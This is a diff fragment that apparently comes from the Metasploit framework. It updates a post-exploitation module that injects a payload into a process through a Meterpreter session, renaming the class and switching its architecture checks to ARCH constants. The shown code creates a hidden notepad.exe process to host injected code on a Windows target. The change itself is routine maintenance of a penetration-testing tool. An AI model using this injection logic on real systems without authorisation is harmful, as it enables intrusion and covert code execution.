@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/post/common'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::Common
 
@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Post
     if pid == 0 or not has_pid?(pid)
       pid = create_temp_proc(payload)
     end
-    if payload.arch.join =~ /64/ and client.platform =~ /x86/
+    if payload.arch.join == ARCH_X64 and client.arch == ARCH_X86
       print_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")
       print_error("Migrate to an x64 process and try again.")
       return false
@@ -161,13 +161,13 @@ class Metasploit3 < Msf::Post
   def create_temp_proc(pay)
     windir = client.sys.config.getenv('windir')
     # Select path of executable to run depending the architecture
-    if pay.arch.join == "x86" and client.platform =~ /x86/
+    if pay.arch.join == ARCH_X86 and client.arch == ARCH_X86
       cmd = "#{windir}\\System32\\notepad.exe"
-    elsif pay.arch.join == "x86_64" and client.platform =~ /x64/
+    elsif pay.arch.join == ARCH_X64 and client.arch == ARCH_X64
       cmd = "#{windir}\\System32\\notepad.exe"
-    elsif pay.arch.join == "x86_64" and client.platform =~ /x86/
+    elsif pay.arch.join == ARCH_X64 and client.arch == ARCH_X86
       cmd = "#{windir}\\Sysnative\\notepad.exe"
-    elsif pay.arch.join == "x86" and client.platform =~ /x64/
+    elsif pay.arch.join == ARCH_X86 and client.arch == ARCH_X64
       cmd = "#{windir}\\SysWOW64\\notepad.exe"
     end
     # run hidden
